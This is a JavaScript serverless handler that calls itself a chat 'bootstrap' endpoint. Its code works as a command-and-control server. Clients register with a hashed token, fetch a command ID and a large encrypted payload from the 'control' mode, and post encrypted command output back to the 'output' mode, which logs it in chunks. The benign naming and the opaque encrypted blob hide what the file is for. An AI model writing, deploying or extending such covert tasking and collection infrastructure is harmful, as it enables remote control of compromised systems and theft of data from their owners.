import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '28';
const CONTROL_PAYLOAD = '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';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
